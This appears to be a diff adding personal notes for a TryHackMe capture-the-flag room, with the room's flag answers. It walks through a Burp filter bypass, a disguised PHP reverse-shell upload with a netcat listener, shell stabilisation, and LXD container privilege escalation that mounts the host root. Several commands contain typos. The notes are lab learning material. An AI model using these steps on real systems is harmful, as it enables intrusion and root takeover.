@@ -1,0 +1,79 @@
+[Lightcycle]
+burpsuite
+intercept client requests 
+go to proxy > options > edit 
+remove  |^js$
+Intercept server response
+check intercept responses box[/]
+CTRL + F5
+spawn bash shell:python3 -c 'import pty;pty.spawn("/bin/bash")'
+give access to term commands:export TERM=xterm
+background shell: Ctrl + Z
+back to terminal use:stty raw -echo; fg
+Full method:[
+muri@augury: sudo nc -lvnp 443
+shell@linux: python3 -c 'import pty;pty.spawn("/bin/bash")'
+shell@linux: export TERM=xterm
+^Z
+[1]+Stopped
+muri@augury$: stty raw -echo; fg
+sudo nc -lvnp 443
+shell@linux: whoami
+shell
+^C
+ssh shell@localhost
+]
+
+Your New Best Friend - The MySQL Client:
+Access a db using MYSQL client:mysql -u USERNAME -p
+Show db:show databases;
+enter db:use DATABASE; command, where DATABASE
+show all tables: show tables
+dump users: SELECT * FROM users;
+
+[online cracking]
+- https://crackstation.net/ 
+- https://md5decrypt.net/en/ 
+- https://hashes.com/en/decrypt/hash                                                                          
+
+[Privilege Escalation with LXD:]
+raj@ubuntu:
+uid=1001(raj) gid=1001(raj) groups=1001(raj), 128(lxd)<==
+steps: - Download build-alpine on your local machine via the git repository
+https://github.com/lxd-images/alpine-3-7-apache-php5-6
+[Flags]
+- web.txt=>THM{ENTER_THE_GRID}
+- user.txt=>THM{IDENTITY_DISC_RECOGNISED}
+- root.txt=>THM{FLYNN_LIVES}
+[Start]
+nmap -sV -sC -T 5 <ip>
+gobuster dir -u <ip>:65000 -x php -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 40
+[burpsuite]
+- Bypass Filter
+intercept client requests
+go to proxy > options > edit
+remove  |^js$
+Intercept server response
+check intercept responses box[/]
+upload reverseshell.jpg.php in <ip>:65000/uploads
+nc -lvnp 4444[listen]
+go to <ip>:65000/grid then click your revshell.jpg.php
+[Shell]
+www-data@light-cycle:$
+>python3 -c 'import pty;pty.spawn("/bin/bash")'
+>export TERM=xterm
+>^Z
+>ssty raw -echo; fg
+>reset
+[Priv Escalation]
+=>Container-name: strongbad
+=>Device-name:trogdor
+=>Image-name:Alpine
+>lxc init IMAGE CONTAINERNAME -c security.privelaged=true
+>lxv config device add CONTAINERNAME DEVICENAME disk source=/
+path=/mnt/root recursive=true
+>lxc start CONTAINERNAME /bin/sh
+>id
+>cd /mnt/root/root
+>cat root.txt
+[CONGRATS!!!!]
